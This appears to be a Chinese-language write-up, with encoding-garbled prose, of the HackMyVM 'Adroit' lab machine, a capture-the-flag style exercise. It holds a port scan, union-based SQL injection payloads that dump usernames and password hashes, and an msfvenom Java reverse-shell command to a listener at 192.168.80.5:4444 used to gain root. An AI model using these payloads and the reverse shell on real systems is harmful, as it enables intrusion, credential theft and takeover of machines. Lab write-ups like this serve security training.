---
{"created":"2024-12-03T16:31:49.199+08:00","tags":["HMV","javaåç¼–è¯‘","SQLæ³¨å…¥"],"Type":"wp","dg-publish":true,"éš¾åº¦":"â­ï¸â­ï¸â­ï¸â­ï¸","ä½œè€…":"alienum","aliases":null,"ç³»ç»Ÿ":"Linux","permalink":"/24-æ¸—é€/HMV/36.Adroit/","dgPassFrontmatter":true,"noteIcon":"2"}
---

## 1. åŸºæœ¬ä¿¡æ¯^toc

- [[24-æ¸—é€/HMV/36.Adroit#1. åŸºæœ¬ä¿¡æ¯^toc\|1. åŸºæœ¬ä¿¡æ¯]]
- [[24-æ¸—é€/HMV/36.Adroit#2. ä¿¡æ¯æ”¶é›†\|2. ä¿¡æ¯æ”¶é›†]]
- [[24-æ¸—é€/HMV/36.Adroit#3. javaåç¼–è¯‘\|3. javaåç¼–è¯‘]]
- [[24-æ¸—é€/HMV/36.Adroit#4. sqlæ³¨å…¥\|4. sqlæ³¨å…¥]]
- [[24-æ¸—é€/HMV/36.Adroit#5. è§£å¯†å¯†ç \|5. è§£å¯†å¯†ç ]]
- [[24-æ¸—é€/HMV/36.Adroit#6. ææƒ\|6. ææƒ]]
**é¶æœºé“¾æ¥** https://hackmyvm.eu/machines/machine.php?vm=Adroit
**ä½œè€…** alienum
**éš¾åº¦** â­ï¸â­ï¸â­ï¸â­ï¸ï¸
## 2. ä¿¡æ¯æ”¶é›†
```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# fscan -h 192.168.80.11

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.80.11:3306 open
192.168.80.11:3000 open
192.168.80.11:21 open
192.168.80.11:22 open
[*] alive ports len is: 4
start vulscan
[+] ftp 192.168.80.11:21:anonymous
   [->]pub

```
ftp
```bash
ftp> ls -a
229 Entering Extended Passive Mode (|||40570|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Mar 19  2021 .
drwxr-xr-x    3 ftp      ftp          4096 Jan 14  2021 ..
-rw-r--r--    1 ftp      ftp          5451 Jan 14  2021 adroitclient.jar
-rw-r--r--    1 ftp      ftp           229 Mar 19  2021 note.txt
-rw-r--r--    1 ftp      ftp         36430 Jan 14  2021 structure.PNG

```
`structrue.png`
![Pasted image 20241203164149](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203164149.png)

## 3. javaåç¼–è¯‘
![Pasted image 20241203164747](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203164747.png)
è·å–åˆ°secret `Sup3rS3cur3Dr0it`
![Pasted image 20241203165012](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203165012.png)
åŸŸå `adroit.local`
![Pasted image 20241203165048](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203165048.png)
ç”¨æˆ·å `zeus` åŸŸå `god.thunder.olympus`

æ·»åŠ ä¸€ä¸ªåŸŸå `adroit.local`

å°è¯•è¿è¡Œä¸€ä¸‹jaråŒ…
> è¿™é‡Œæˆ‘ç”¨jdk8è¿è¡Œä¸äº† ï¼Œåˆ‡æ¢åˆ°jdk11å¯ä»¥è¿è¡Œ

æç¤ºè¾“å…¥è´¦æˆ·å¯†ç  æŒ¨ä¸ªæµ‹è¯•å³å¯
```java
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Adroit]
â””â”€# java -jar adroitclient.jar
Enter the username :
zeus
Enter the password :
Sup3rS3cur3Dr0it
Wrong username or password   

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Adroit]
â””â”€# java -jar adroitclient.jar
Enter the username :
zeus
Enter the password :
god.thunder.olympus
Options [ post | get ] :
get
Enter the phrase identifier :
1

```
`god.thunder.olympus` å°±æ˜¯å¯†ç 

## 4. sqlæ³¨å…¥
```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Adroit]
â””â”€# java -jar adroitclient.jar
Enter the username :
zeus
Enter the password :
god.thunder.olympus
Options [ post | get ] :
get
Enter the phrase identifier :

1 union select 1,database() -- -
--> adroit

1 union select 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema ='adroit' -- -
-->  ideas,users

1 union select 1,group_concat(column_name) from information_schema.columns where table_name ='users' -- -
--> 
id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS

1 union select 1,group_concat(username,0x3a,password) from users -- -
--> writer:l4A+n+p+xSxDcYCl0mgxKr015+OEC3aOfdrWafSqwpY=
```
è·å–åˆ°äº†è´¦æˆ·å¯†ç  `writer:l4A+n+p+xSxDcYCl0mgxKr015+OEC3aOfdrWafSqwpY=`
ä½†æ˜¯å¯†ç æ˜¯åŠ å¯†çš„

ä½†æ˜¯åŠ å¯†çš„
## 5. è§£å¯†å¯†ç 
è§£å¯†çš„ä»£ç å¯ä»¥åœ¨jaråŒ…åç¼–è¯‘ä¸­å‘ç°
![Pasted image 20241203172527](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203172527.png)
å¯†é’¥ä¸Šé¢è·å–åˆ°äº†æ˜¯ `Sup3rS3cur3Dr0it`
ä½†æ˜¯æ³¨æ„è¿™é‡Œéœ€è¦å°†0æ¢æˆO
æ‰€ä»¥æ­£ç¡®çš„å¯†é’¥æ˜¯ `Sup3rS3cur3DrOit`

å‚è€ƒ [Mikannseçš„wp](https://mikannse.space/2024/02/17/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B9%9D%E4%B8%89)%E4%B9%8BHMVAndroit/)å¯¹è¿™ä¸ªè¿›è¡Œè§£å¯†


è·å–åˆ°å¯†ç æ˜¯ `just.write.my.ideas`

## 6. ææƒ
åˆ©ç”¨è´¦æˆ·å¯†ç ç™»å½•
```bash
writer ï¼š just.write.my.ideas
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Adroit]
â””â”€# ssh writer@192.168.80.11
writer@192.168.80.11''s password:
Linux adroit 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jan 14 23:14:06 2021 from 10.0.2.15
writer@adroit:~$ id
uid=1000(writer) gid=1000(writer) groups=1000(writer),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
writer@adroit:~$ whoami
writer

```

```bash
writer@adroit:~$ sudo -l
[sudo] password for writer:
Matching Defaults entries for writer on adroit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User writer may run the following commands on adroit:
    (root) /usr/bin/java -jar /tmp/testingmyapp.jar

```

msfç”ŸæˆjaråŒ… åå¼¹shell
```bash
msfvenom -p java/shell_reverse_tcp lhost=192.168.80.5 lport=4444 -f jar -o reverse.jar

writer@adroit:/tmp$ cp reverse.jar  /tmp/testingmyapp.jar
writer@adroit:/tmp$ sudo -u root java -jar /tmp/testingmyapp.jar

[17:54:28] Welcome to pwncat ğŸˆ!                                                                       __main__.py:164
[17:56:16] received connection from 192.168.80.11:51550                                                     bind.py:84
[17:56:17] 0.0.0.0:4444: upgrading from /usr/bin/dash to /usr/bin/bash                                  manager.py:957
           192.168.80.11:51550: registered new host w/ db                                               manager.py:957
(local) pwncat$
(remote) root@adroit:/tmp# whoami
root
(remote) root@adroit:/root# ls
root.txt
(remote) root@adroit:/root# cat root.txt
017a030885f25af277dd891d0f151845
(remote) root@adroit:/root# cd /home/writer/
(remote) root@adroit:/home/writer# cat user.txt
61de3a25161dcb2b88b5119457690c3c
(remote) root@adroit:/home/writer#
```

> æˆ‘è§‰å¾—è¿™ä¸ªé¶åœºä¸ç®—éš¾ã€‚éš¾ç‚¹åªæ˜¯åœ¨åˆ†æjavaä»£ç é‚£é‡Œï¼Œä¸è¿‡æˆ‘çœ‹ä¸æ‡‚java